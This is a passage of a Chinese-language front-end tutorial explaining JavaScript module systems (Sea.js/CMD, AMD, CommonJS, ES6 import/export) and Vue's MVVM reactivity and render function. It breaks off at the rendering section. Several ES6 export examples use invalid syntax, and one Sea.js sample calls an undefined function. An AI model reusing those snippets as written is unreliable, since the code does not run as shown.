<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="function"><span class="keyword">function</span> (<span class="params">require, exports, module</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> showLog = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'title clicked'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  exports.showLog = showLog; <span class="comment">// 输出showLog方法</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
</li>
<li><p>案例3(设置别名等config)</p>
<p>index.html</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.bootcss.com/seajs/3.0.3/sea.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">  seajs.config(&#123;</span></span><br><span class="line"><span class="javascript">    alias:&#123; <span class="comment">// alias 用于设置别名</span></span></span><br><span class="line"><span class="javascript">      <span class="comment">// 引入jQuery</span></span></span><br><span class="line"><span class="javascript">      jquery:<span class="string">'plugin/jquery'</span>,</span></span><br><span class="line"><span class="javascript">      <span class="comment">// 引入bootstrap</span></span></span><br><span class="line"><span class="javascript">      bootstrap:<span class="string">'plugin/bootstrap'</span>,</span></span><br><span class="line"><span class="javascript">      <span class="comment">// a.js</span></span></span><br><span class="line"><span class="javascript">      a:<span class="string">'a'</span>,</span></span><br><span class="line"><span class="javascript">      <span class="comment">// b.js</span></span></span><br><span class="line"><span class="javascript">      b:<span class="string">'b'</span>,</span></span><br><span class="line"><span class="javascript">      <span class="comment">// 引入c.js</span></span></span><br><span class="line"><span class="javascript">      c:<span class="string">'c'</span></span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  &#125;);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">  seajs.use(<span class="string">'./main.js'</span>); <span class="comment">// 通过seajs.use加载main.js文件</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>某个第三方插件，如jquery</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="function"><span class="keyword">function</span> (<span class="params">require, exports, module</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// jquery 源码</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>main.js</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="function"><span class="keyword">function</span> (<span class="params">require, exports, module</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> $ = <span class="built_in">require</span>(<span class="string">'jquery'</span>);</span><br><span class="line">  $(<span class="string">'#title'</span>).text(changeText.init());</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="AMD、CMD的区别"><a href="#AMD、CMD的区别" class="headerlink" title="AMD、CMD的区别"></a>AMD、CMD的区别</h3><ul>
<li>对于依赖的模块，<code>AMD</code> 是提前执行，<code>CMD</code> 是延迟执行。不过 <code>RequireJS</code> 从 2.0 开始，也改成可以延迟执行（根据写法不同，处理方式不同）。<code>CMD</code> 推崇 <code>as lazy as possible</code>（尽可能的懒加载，也称为延迟加载，即在需要的时候才加载）。</li>
<li><code>AMD</code> 推崇依赖前置，<code>CMD</code> 推崇依赖就近。</li>
<li><code>AMD</code> 的 <code>API</code> 默认是一个当多个用，<code>CMD</code> 的 <code>API</code> 严格区分，推崇职责单一。比如 <code>AMD</code> 里，<code>require</code> 分全局 <code>require</code> 和局部 <code>require</code>，都叫 <code>require</code>。<code>CMD</code> 里，没有全局 <code>require</code>，而是根据模块系统的完备性，提供 <code>seajs.use</code> 来实现模块系统的加载启动。<code>CMD</code> 里，每个 <code>API</code> 都简单纯粹。</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// AMD 默认推荐的是</span></span><br><span class="line">define([<span class="string">'./a'</span>, <span class="string">'./b'</span>], <span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>) </span>&#123; <span class="comment">// 依赖必须一开始就写好</span></span><br><span class="line">  a.doSomething();</span><br><span class="line">  b.doSomething();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// CMD</span></span><br><span class="line">define(<span class="function"><span class="keyword">function</span>(<span class="params">require, exports, module</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="built_in">require</span>(<span class="string">'./a'</span>); <span class="comment">// 依赖可以就近书写</span></span><br><span class="line">  a.doSomething();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> b = <span class="built_in">require</span>(<span class="string">'./b'</span>);</span><br><span class="line">  b.doSomething();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h3 id="CommonJS"><a href="#CommonJS" class="headerlink" title="CommonJS"></a>CommonJS</h3><p><code>CommonJS</code> 规范是通过 <code>module.exports</code> 来定义的，在前端浏览器中，并不支持 <code>module.exports</code>，<code>Nodejs</code> 端是使用 <code>CommonJS</code> 规范的，前端浏览器一般使用 <code>AMD</code>、<code>CMD</code>、<code>ES6</code>等定义模块化开发的。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">var</span> addX = <span class="function"><span class="keyword">function</span> (<span class="params">value</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> value + x;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">module</span>.exports.x = x;</span><br><span class="line"><span class="built_in">module</span>.exports.addX = addX;</span><br></pre></td></tr></table></figure></p>
<p>为了方便，<code>Node</code> 为每个模块提供一个 <code>exports</code> 变量，指向 <code>module.exports</code>，相当于在文件的开头定义了：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> exports = <span class="built_in">module</span>.exports;</span><br></pre></td></tr></table></figure></p>
<p>案例：</p>
<p>math.js:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 累加函数</span></span><br><span class="line">exports.add = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> sum = <span class="number">0</span>, i = <span class="number">0</span>, args = <span class="built_in">arguments</span>, len = args.length;</span><br><span class="line">  <span class="keyword">while</span> (i &lt; len) &#123;</span><br><span class="line">    sum += args[i++];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> sum;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>increment.js:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> add = <span class="built_in">require</span>(<span class="string">'math'</span>).add;</span><br><span class="line">exports.increment = <span class="function"><span class="keyword">function</span>(<span class="params">val</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> add(val, <span class="number">1</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>index.js:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> increment = <span class="built_in">require</span>(<span class="string">'increment'</span>).increment;</span><br><span class="line"><span class="keyword">var</span> a = increment(<span class="number">1</span>); <span class="comment">// 2</span></span><br></pre></td></tr></table></figure></p>
<p>一个单独的文件就是一个模块。每一个模块都是一个单独的作用域，也就是说，在该模块内部定义的变量，无法被其他模块读取，除非定义为 <code>global</code> 对象的属性。</p>
<p>输出模块变量的最好方法是使用 <code>module.exports</code> 对象。</p>
<p>加载模块使用 <code>require</code> 方法，该方法读取一个文件并执行，返回文件内部的 <code>module.exports</code>对象。</p>
<h3 id="ES6"><a href="#ES6" class="headerlink" title="ES6"></a>ES6</h3><p><code>es6</code> 中使用 <code>import/export</code> 来进行导出导入</p>
<ul>
<li><p>示例：<br>lib.js导出:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//导出常量</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> sqrt = <span class="built_in">Math</span>.sqrt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//导出函数</span></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">square</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x * x;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//导出函数</span></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">diag</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> sqrt(square(x) + square(y));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>main.js导入:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; square, diag &#125; <span class="keyword">from</span> <span class="string">'./lib'</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(square(<span class="number">11</span>)); <span class="comment">// 121</span></span><br><span class="line"><span class="built_in">console</span>.log(diag(<span class="number">4</span>, <span class="number">3</span>)); <span class="comment">// 5</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>特殊语法<br>1、我们可以使用 <code>export default a</code> 来默认导出一个模块，相当于匿名导出</p>
<p>common.js导出:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设定一个默认输出模块</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> openApp() &#123;</span><br><span class="line">  <span class="comment">// ***</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 除了一个默认的模块之外，其余的使用正常的导出</span></span><br><span class="line"><span class="keyword">export</span> showAlert = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ***</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> showToast = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ***</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>main.js导入:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注：对于默认导出的模块，我们可以另行设置一个名字，其他的必须与导出时的名字一致</span></span><br><span class="line"><span class="keyword">import</span> open_app, &#123; showAlert, showToast &#125; <span class="keyword">from</span> <span class="string">'./common.js'</span>;</span><br><span class="line"></span><br><span class="line">open_app();</span><br><span class="line">showAlert();</span><br><span class="line">showToast();</span><br></pre></td></tr></table></figure>
<p>2、在 <code>export</code> 导出 或 <code>import</code> 导入的时候使用 <code>xx as yy</code> 来设置一个别名<br>2.1 导出时设置别名：</p>
<p>common.js:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> showAlert = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ***</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> &#123;</span><br><span class="line">  showAlert <span class="keyword">as</span> show_alert,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>main.js导入:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; show_alert &#125; <span class="keyword">from</span> <span class="string">'./common.js'</span>;</span><br><span class="line"></span><br><span class="line">show_alert();</span><br></pre></td></tr></table></figure>
<p>2.2 导入时设置别名：<br>common.js导出:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> showAlert = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ***</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> &#123; showAlert &#125;;</span><br></pre></td></tr></table></figure>
<p>main.js导入:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; showAlert <span class="keyword">as</span> show_alert &#125; <span class="keyword">from</span> <span class="string">'./common.js'</span>;</span><br><span class="line"></span><br><span class="line">show_alert();</span><br></pre></td></tr></table></figure>
<p>3、使用通配符 <code>*</code> 来指定一个对象，将所有的输出都挂载改对象上，通常 <code>*</code> 会结合 <code>as</code> 使用<br>common.js导出:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> showAlert = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ***</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> showToast = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ***</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>main.js导入:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> common <span class="keyword">from</span> <span class="string">'./common.js'</span>;</span><br><span class="line"></span><br><span class="line">common.showAlert();</span><br><span class="line">common.showToast();</span><br></pre></td></tr></table></figure>
<p>4、建议<br>当我们明确知道自己需要使用哪些依赖时，我们应该按需加载，只 <code>import</code> 我们需要的那些依赖，这样在打包的时候可以忽略掉其他未使用，减少文件体积。</p>
</li>
</ul>
<hr>
<h2 id="M-V-VM"><a href="#M-V-VM" class="headerlink" title="M-V-VM"></a>M-V-VM</h2><blockquote>
<p>参考<a href="https://segmentfault.com/a/1190000015895017" target="_blank" rel="noopener">segmentfault MVVM框架理解及其原理实现</a></p>
</blockquote>
<p>说起 <code>MVVM</code>，就不得不先说下 <code>MVC</code>。<br><img src="../images/other/other-mvc.png" title="MVC关系图"></p>
<p>分成 <code>Model</code>、<code>View</code>、<code>Controller</code>，视图上发生变化，通过 <code>Controller</code>（控件）将响应传入到 <code>Model</code>（数据源），由数据源改变 <code>View</code> 上面的数据。<strong>MVC框架允许View和Model直接进行通信！！</strong></p>
<p>但是 <code>View</code> 和 <code>Model</code> 之间随着业务量的不断庞大，会出现蜘蛛网一样难以处理的依赖关系，完全背离了开发所应该遵循的“开放封闭原则”。</p>
<p>面对这个问题，<code>MVVM</code> 框架就出现了，它与 <code>MVC</code> 框架的主要区别有两点：<br><strong>1、实现数据与视图的分离</strong><br><strong>2、通过数据来驱动视图，开发者只需要关心数据变化，DOM操作被封装了。</strong></p>
<p><img src="../images/other/other-mvvm.png" title="MVVM关系图"></p>
<p>可以看到 <code>MVVM</code> 分别指 <code>View</code>、<code>Model</code>、<code>View-Model</code>，<code>View</code> 通过 <code>View-Model</code> 的 <code>DOM Listeners</code> 将事件绑定到 <code>Model</code> 上，而 <code>Model</code> 则通过 <code>Data Bindings</code> 来管理 <code>View</code> 中的数据，<code>View-Model</code> 从中起到一个连接桥的作用。</p>
<h3 id="核心"><a href="#核心" class="headerlink" title="核心"></a>核心</h3><ul>
<li><p><strong>响应式：vue如何监听data的属性变化</strong><br>假设 <code>data</code> 开始是这样的：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  name: <span class="string">'zhangsan'</span>,</span><br><span class="line">  age: <span class="number">25</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当执行修改操作，如下：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(obj.name) <span class="comment">// 访问</span></span><br><span class="line">obj.age = <span class="number">22</span>; <span class="comment">// 修改</span></span><br></pre></td></tr></table></figure>
<p>但是这样的操作vue本身是没有办法感知到的，那么应该如何让vue知道我们进行了访问或是修改的操作呢？<br>那就要使用 <code>Object.defineProperty</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.defineProperty(obj, prop, descriptor)</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  obj: 对象</span></span><br><span class="line"><span class="comment">  prop: 属性</span></span><br><span class="line"><span class="comment">  descriptor: 属性描述符</span></span><br><span class="line"><span class="comment">    数据描述符、存取描述符共有: configurable、enumerable</span></span><br><span class="line"><span class="comment">    数据描述符: value、writable</span></span><br><span class="line"><span class="comment">      var obj = &#123; a: 1 &#125;</span></span><br><span class="line"><span class="comment">      Object.defineProperty(obj, 'a', &#123; value: 2 &#125;)</span></span><br><span class="line"><span class="comment">    存取描述符: get、set，vue的监听变化实际就是通过这个get和set实现的</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> data = &#123;</span><br><span class="line">  name: <span class="string">'zhangsan'</span>,</span><br><span class="line">  age: <span class="number">20</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> key, value</span><br><span class="line"><span class="keyword">for</span> (key <span class="keyword">in</span> data) &#123; <span class="comment">// 遍历data中所有的字段</span></span><br><span class="line">  (<span class="function"><span class="keyword">function</span> (<span class="params">key</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">Object</span>.defineProperty(data, key, &#123;</span><br><span class="line">      <span class="comment">// 当只是一个修改值时，此处写value: newValue即可</span></span><br><span class="line">      get: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'get'</span>, data[key]) <span class="comment">// 监听</span></span><br><span class="line">        <span class="keyword">return</span> data[key]</span><br><span class="line">      &#125;,</span><br><span class="line">      set: <span class="function"><span class="keyword">function</span> (<span class="params">newVal</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'set'</span>, newVal) <span class="comment">// 监听</span></span><br><span class="line">        data[key] = newVal</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)(key)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>  通过 <code>Object.defineProperty</code> 将data里的每一个属性的访问与修改都变成了一个函数，在函数get和set中我们即可监听到data的属性发生了改变。</p>
<ul>
<li><p><strong>模板解析：vue的模板是如何被解析的</strong><br>模板本质上是一串字符串，它看起来和 <code>html</code> 的格式很相像，实际上有很大的区别，因为模板本身还带有逻辑运算，比如 <code>v-if</code>，<code>v-for</code> 等等，但它最后还是要转换为 <code>html</code> 来显示。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">v-model</span>=<span class="string">"title"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">v-on:click</span>=<span class="string">"add"</span>&gt;</span>submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">"item in list"</span>&gt;</span>&#123;&#123;item&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>模板在 <code>vue</code> 中必须转换为 <code>JS</code> 代码，原因在于：在前端环境下，只有 <code>JS</code> 才是一个图灵完备语言，才能实现逻辑运算，以及渲染为 <code>html</code> 页面。</p>
<p>这里就引出了vue中一个特别重要的函数——<strong>render</strong></p>
<p><code>render</code> 函数中的核心就是 <code>with</code> 函数。</p>
<blockquote>
<p>with: with函数将某个对象添加到作用域链的顶部，如果在 statement中有某个未使用命名空间的变量，跟作用域链中的某个属性同名，则这个变量将指向这个属性值。</p>
</blockquote>
<p>上例中使用 <code>with</code> 解析的过程如下：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span>(<span class="keyword">this</span>)&#123;  <span class="comment">// this 就是 vm</span></span><br><span class="line">    <span class="keyword">return</span> _c(</span><br><span class="line">        <span class="string">'div'</span>,</span><br><span class="line">        &#123;</span><br><span class="line">            attrs:&#123;<span class="string">"id"</span>:<span class="string">"app"</span>&#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        [</span><br><span class="line">            _c(</span><br><span class="line">                <span class="string">'div'</span>,</span><br><span class="line">                [</span><br><span class="line">                    _c(</span><br><span class="line">                        <span class="string">'input'</span>,</span><br><span class="line">                        &#123;</span><br><span class="line">                            directives:[</span><br><span class="line">                                &#123;</span><br><span class="line">                                    name:<span class="string">"model"</span>,</span><br><span class="line">                                    rawName:<span class="string">"v-model"</span>,</span><br><span class="line">                                    value:(title),</span><br><span class="line">                                    expression:<span class="string">"title"</span></span><br><span class="line">                                &#125;</span><br><span class="line">                            ],</span><br><span class="line">                            domProps:&#123;</span><br><span class="line">                                <span class="string">"value"</span>:(title)</span><br><span class="line">                            &#125;,</span><br><span class="line">                            on:&#123;</span><br><span class="line">                                <span class="string">"input"</span>:<span class="function"><span class="keyword">function</span>(<span class="params">$event</span>)</span>&#123;</span><br><span class="line">                                    <span class="keyword">if</span>($event.target.composing)<span class="keyword">return</span>;</span><br><span class="line">                                    title=$event.target.value</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    ),</span><br><span class="line">                    _v(<span class="string">" "</span>),</span><br><span class="line">                    _c(</span><br><span class="line">                        <span class="string">'button'</span>,</span><br><span class="line">                        &#123;</span><br><span class="line">                            on:&#123;</span><br><span class="line">                                <span class="string">"click"</span>:add</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;,</span><br><span class="line">                        [_v(<span class="string">"submit"</span>)]</span><br><span class="line">                    )</span><br><span class="line">                ]</span><br><span class="line">            ),</span><br><span class="line">            _v(<span class="string">" "</span>),</span><br><span class="line">            _c(<span class="string">'div'</span>,</span><br><span class="line">                [</span><br><span class="line">                    _c(</span><br><span class="line">                        <span class="string">'ul'</span>,</span><br><span class="line">                        _l((list),<span class="function"><span class="keyword">function</span>(<span class="params">item</span>)</span>&#123;<span class="keyword">return</span> _c(<span class="string">'li'</span>,[_v(_s(item))])&#125;)</span><br><span class="line">                    )</span><br><span class="line">                ]</span><br><span class="line">            )</span><br><span class="line">        ]</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中的 <code>_c</code> 函数表示的是创建一个新的html元素，其基本用法为：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_c(element,&#123;attrs&#125;,[children...])</span><br></pre></td></tr></table></figure>
<p>其中的element表示所要创建的html元素类型，attrs表示所要创建的元素的属性，children表示该html元素的子元素。</p>
<p><code>_v</code> 函数表示创建一个文本节点，<code>_l</code> 函数表示创建一个数组。</p>
<p>最终render函数返回的是一个虚拟DOM。</p>
</li>
</ul>
<ul>
<li><p><strong>渲染：vue模板是如何被渲染成HTML的</strong></p>
